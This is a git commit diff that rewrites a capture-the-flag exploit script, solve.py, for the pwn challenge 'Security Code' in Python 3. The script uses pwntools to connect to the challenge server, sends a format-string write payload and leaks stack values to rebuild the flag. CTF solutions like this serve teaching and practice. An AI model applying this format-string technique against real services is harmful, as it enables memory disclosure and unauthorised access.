6170cdc9e1e076cd379e948bbb83367224eaf567
TMUCTF <90703099+TMUCTF@users.noreply.github.com>
2021-09-17 17:23:50 +0430

    Update solve.py

--- Pwn/Security Code/Writeup Files/solve.py
+++ Pwn/Security Code/Writeup Files/solve.py
@@ -2,32 +2,32 @@ import pwn
 import time
 
 i = 6
-l = []
-while(i != 30):
-	r = pwn.remote('185.235.41.205', 7040)
-	r.recvlines(11)
-	r.sendline('A')
-	r.recvline()
-	w = {0x0804c03c:0xabadcafe}
-	pay = pwn.fmtstr_payload(15, w)
-	r.sendline(pay)
-	r.recvline()
-	r.recvline()	
-	p = "%" + str(i) + "$p"
-	r.sendline(p)
-	adminPass = r.recvlines(3)[2].split(" ")[-1]
-	l.append(adminPass)
-	try:
-		print(pwn.p32(int(adminPass, 16)))
-	except:
-		pass
-	i = i + 1
+a = []
+while i != 30:
+    r = pwn.remote("185.235.41.205", 7040)
+    r.recvlines(11)
+    r.sendline("A".encode())
+    r.recvline()
+    w = {0x0804c03c: 0xabadcafe}
+    p = pwn.fmtstr_payload(15, w)
+    r.sendline(p)
+    r.recvline()
+    r.recvline()
+    p = "%" + str(i) + "$p"
+    r.sendline(p.encode())
+    admin_pass = r.recvlines(3)[2].decode().split(" ")[-1]
+    a.append(admin_pass)
+    try:
+        print(pwn.p32(int(admin_pass, 16)))
+    except:
+        pass
+    i += 1
 
-pl = []
-for k in l[6:21]:
-	try:
-		pl.append(pwn.p32(int(k, 16)))
-	except Exception as e:
-		pass
-	
-print("".join(pl))
+flag = []
+for k in a[1:21]:
+    try:
+        flag.append(pwn.p32(int(k, 16)).decode())
+    except Exception as e:
+        pass
+
+print("".join(flag))
